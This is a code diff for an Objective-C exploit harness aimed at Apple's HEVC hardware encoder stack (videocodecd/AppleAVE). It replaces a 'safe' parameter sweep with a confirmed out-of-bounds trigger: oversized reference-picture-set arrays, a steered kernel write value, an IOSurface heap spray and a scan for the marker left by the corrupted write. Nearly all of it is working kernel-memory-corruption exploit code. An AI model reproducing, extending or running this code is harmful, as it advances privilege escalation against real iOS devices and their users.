@@ -63,21 +63,38 @@
     }
     [report appendString:@"encoder session created\n"];
 
-    // Phase 2: build RPS dictionary
+    // Phase 2: build RPS dictionary with the keys AVE_HEVC_ST_RPS_Retrieve reads
+    // (AVE_CFDict_GetBool on flags + DeltaPOCS0/1Minus1 arrays; >16 elements
+    // overflows the fixed HEVC_SHORT_TERM_RPS slots).
     [report appendString:@"\n--- Phase 2: build RPS ---\n"];
-    NSMutableArray *deltaArr = [NSMutableArray array];
-    for (int i = 0; i < 32; i++) [deltaArr addObject:@(0x4100 + i)];
-    NSDictionary *rpsDict = @{@"DeltaPOCS0Minus1": deltaArr};
-    [report appendFormat:@"RPS: %d entries\n", 32];
+    NSMutableArray *deltaS0 = [NSMutableArray array];
+    NSMutableArray *deltaS1 = [NSMutableArray array];
+    for (int i = 0; i < 32; i++) {
+        [deltaS0 addObject:@(0x4100 + i)];
+        [deltaS1 addObject:@(0x4200 + i)];
+    }
+    NSDictionary *rpsDict = @{
+        @"DeltaPOCS0Minus1": deltaS0,
+        @"DeltaPOCS1Minus1": deltaS1,
+        @"NumPositivePics": @16,
+        @"NumNegativePics": @16,
+        @"UsedByCurrPicS0": @YES,
+        @"UsedByCurrPicS1": @YES,
+    };
+    [report appendFormat:@"RPS: S0=%lu S1=%lu entries (OOB >16 slots)\n",
+     (unsigned long)deltaS0.count, (unsigned long)deltaS1.count];
 
-    // Phase 3: systematic property name scan
-    [report appendString:@"\n--- Phase 3: property name scan ---\n"];
+    // Phase 3: ONLY the valid @[rpsDict] container (ollie).
+    // A bare deltaArr (NSNumber elements) kills videocodecd before encode:
+    // AVE_HEVC_ST_RPS_RetrieveArray -> CFDictionaryContainsKey on NSNumber -> SIGABRT
+    // (videocodecd-2026-11-08-061221.ips).
+    [report appendString:@"\n--- Phase 3: UserRPSForFaceTime (@[rpsDict] only) ---\n"];
     NSArray *propKeys = @[
         @"UserRPSForFaceTime", @"UserRPS", @"AVEUserRPSForFaceTime",
         @"kVTCompressionPropertyKey_UserRPSForFaceTime", @"RPS",
         @"ReferencePictureSet", @"AVE_HEVC_RPS", @"FaceTimeRPS",
     ];
-    NSArray *propValues = @[rpsDict, @[rpsDict], deltaArr];
+    NSArray *propValues = @[ @[rpsDict] ];
     for (NSString *key in propKeys) {
         for (id val in propValues) {
             status = VTSessionSetProperty(session,
@@ -101,7 +118,9 @@
         memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
         CVPixelBufferUnlockBaseAddress(pb, 0);
 
-        NSDictionary *frameProps = @{@"UserRPSForFaceTime": rpsDict};
+        // Same valid container as Phase 3 — a bare dict/number array here can hit
+        // the same CFDictionaryContainsKey-on-NSNumber abort in the daemon.
+        NSDictionary *frameProps = @{@"UserRPSForFaceTime": @[rpsDict]};
         VTEncodeInfoFlags flags = 0;
         CMTime pts = CMTimeMake(0, 30);
         CMTime dur = CMTimeMake(1, 30);
@@ -125,18 +144,64 @@
     VTCompressionSessionInvalidate(session);
     CFRelease(session);
 
-    // === AVE27 stage13: NTL sweep (safe, below trigger) ===
-    [report appendString:@"\n--- AVE27 stage13: NTL sweep (safe) ---\n"];
+    // === AVE27 stage13: NTL sweep on the proven trigger config (ollie) ===
+    // Confirmed trigger (KPAuditAVE112705Module): 1280x720 + 420YpCbCr8BiPlanarVideoRange.
+    // Steered NTL: x0 = ((NTL-16463) << 32) | 0x59
+    //   NTL 16431..16446 -> x0 in 0xffffffe0..ef 00000059 (kheap family A)
+    //   NTL 15967..16270 -> x0 in 0xfffffe10..3f 00000059 (kheap family B)
+    // Big IOSurface spray first so the target page is mapped and ours; then scan
+    // every surface for the x0 marker written by stp x0,x0,[x0] (+0x59 pattern).
+    [report appendString:@"\n--- AVE27 stage13: NTL sweep (1280x720 420v, steered + spray) ---\n"];
     [report appendString:@"Trigger: EncoderUsage=1 NTL=N (no RCMode; 20 fails -12900 on A17 Pro)\n"];
-    int ntlVals[] = { 1, 100, 1000, 8000, 16000, 16447, 16462 };
-    for (int i = 0; i < 7; i++) {
+    [report appendString:@"x0 = ((NTL-16463) << 32) | 0x59; marker scan = x0 at off, 0 at off+0x18\n"];
+
+    void *isLib2 = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
+    typedef void *(*ISCreateFn2)(CFDictionaryRef);
+    typedef int (*ISLockFn2)(void *, uint32_t, uint32_t *);
+    typedef int (*ISUnlockFn2)(void *, uint32_t, uint32_t *);
+    typedef void *(*ISGetBaseFn2)(void *);
+    typedef size_t (*ISGetSizeFn2)(void *);
+    ISCreateFn2 isCreate2 = isLib2 ? (ISCreateFn2)dlsym(isLib2, "IOSurfaceCreate") : NULL;
+    ISLockFn2 isLock2 = isLib2 ? (ISLockFn2)dlsym(isLib2, "IOSurfaceLock") : NULL;
+    ISUnlockFn2 isUnlock2 = isLib2 ? (ISUnlockFn2)dlsym(isLib2, "IOSurfaceUnlock") : NULL;
+    ISGetBaseFn2 isGetBase2 = isLib2 ? (ISGetBaseFn2)dlsym(isLib2, "IOSurfaceGetBaseAddress") : NULL;
+    ISGetSizeFn2 isGetSize2 = isLib2 ? (ISGetSizeFn2)dlsym(isLib2, "IOSurfaceGetSize") : NULL;
+
+    int ntlVals[] = { 1, 100, 16000, 16115, 16223, 16270, 16431, 16438, 16446, 16447, 16462 };
+    for (int i = 0; i < 11; i++) {
         int ntl = ntlVals[i];
+        uint64_t x0 = ((uint64_t)(int32_t)(ntl - 16463) << 32) | 0x59ULL;
+        int64_t kOff = 16463 - (int64_t)ntl;
+
+        // Spray only for steered kheap windows (k=17..496).
+        CFMutableArrayRef surfArray = NULL;
+        BOOL doSpray = (kOff >= 17 && kOff <= 496) && isCreate2 && isLock2 && isUnlock2 && isGetBase2 && isGetSize2;
+        if (doSpray) {
+            surfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
+            for (int s = 0; s < 24; s++) {
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @1024,
+                    @"IOSurfaceHeight": @2048,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241,
+                };
+                void *surf = isCreate2((__bridge CFDictionaryRef)props);
+                if (surf) {
+                    CFArrayAppendValue(surfArray, surf);
+                    CFRelease(surf);
+                }
+            }
+        }
+        [report appendFormat:@"  NTL=%-5d x0=0x%016llx spray=%ld\n",
+         ntl, x0, surfArray ? (long)CFArrayGetCount(surfArray) : 0L];
+
         VTCompressionSessionRef s2 = NULL;
         OSStatus st2 = VTCompressionSessionCreate(
-            kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
+            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
             NULL, NULL, NULL, NULL, NULL, &s2);
         if (st2 != noErr || !s2) {
             [report appendFormat:@"  NTL=%d session_create=%d FAILED\n", ntl, (int)st2];
+            if (surfArray) CFRelease(surfArray);
             continue;
         }
         CFNumberRef n;
@@ -156,17 +221,24 @@
         if (st2 != noErr) {
             [report appendFormat:@"  NTL=%d set=%d readback=%d prepare=%d FAILED\n", ntl, (int)setSt, rb, (int)st2];
             CFRelease(s2);
+            if (surfArray) CFRelease(surfArray);
             continue;
         }
         CVPixelBufferRef pb2 = NULL;
-        CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb2);
+        CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
+                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb2);
         if (!pb2) {
             [report appendFormat:@"  NTL=%d PIXELBUFFER_FAILED\n", ntl];
             CFRelease(s2);
+            if (surfArray) CFRelease(surfArray);
             continue;
         }
         CVPixelBufferLockBaseAddress(pb2, 0);
-        memset(CVPixelBufferGetBaseAddress(pb2), 0x80, CVPixelBufferGetDataSize(pb2));
+        for (size_t pl = 0; pl < CVPixelBufferGetPlaneCount(pb2); pl++) {
+            void *ba = CVPixelBufferGetBaseAddressOfPlane(pb2, pl);
+            size_t bsz = CVPixelBufferGetDataSizeForPlane(pb2, pl);
+            if (ba && bsz) memset(ba, 0x80, bsz);
+        }
         CVPixelBufferUnlockBaseAddress(pb2, 0);
         VTEncodeInfoFlags f2 = 0;
         st2 = VTCompressionSessionEncodeFrame(s2, pb2, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f2);
@@ -175,6 +247,37 @@
         CVPixelBufferRelease(pb2);
         VTCompressionSessionCompleteFrames(s2, kCMTimeInvalid);
         CFRelease(s2);
+
+        // Marker scan: did stp x0,x0,[x0] land in one of our surfaces?
+        if (surfArray) {
+            long totalHits = 0;
+            CFIndex scount = CFArrayGetCount(surfArray);
+            for (CFIndex si = 0; si < scount; si++) {
+                void *surf = (void *)CFArrayGetValueAtIndex(surfArray, si);
+                uint32_t seed = 0;
+                if (isLock2(surf, 0, &seed) != KERN_SUCCESS) continue;
+                uint8_t *base = (uint8_t *)isGetBase2(surf);
+                size_t sz = isGetSize2(surf);
+                if (base && sz >= 32) {
+                    for (size_t off = 0; off + 32 <= sz; off += 8) {
+                        uint64_t q = *(uint64_t *)(base + off);
+                        if (q == x0) {
+                            uint64_t q2 = *(uint64_t *)(base + off + 8);
+                            uint32_t z = *(uint32_t *)(base + off + 0x18);
+                            [report appendFormat:@"    MARKER HIT surf=%ld off=0x%zx q2=0x%llx z=0x%x\n",
+                             (long)si, off, q2, z];
+                            totalHits++;
+                            if (totalHits >= 4) break;
+                        }
+                    }
+                }
+                isUnlock2(surf, 0, &seed);
+                if (totalHits >= 4) break;
+            }
+            [report appendFormat:@"    marker scan: %ld hit(s) in %ld surfaces\n",
+             totalHits, (long)scount];
+            CFRelease(surfArray);
+        }
     }
 
     // === B-frame DPB overflow ===
